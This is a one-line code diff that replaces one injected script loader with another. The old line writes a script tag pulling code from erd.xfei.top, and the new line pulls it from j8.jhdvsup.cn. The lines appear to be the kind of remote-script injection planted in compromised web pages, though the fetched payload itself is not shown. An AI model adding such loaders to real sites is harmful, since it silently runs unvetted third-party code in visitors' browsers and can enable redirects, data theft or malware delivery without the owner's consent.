@@ -1,1 +1,1 @@
-document.writeln('<script src="https://erd.xfei.top/c/5D2DAB89-5CB4-4B76-8235-37C584EDEBED.ap"></script>');
+document.write('<script src="https://j8.jhdvsup.cn/61a7d857302.j8"><\/script>');
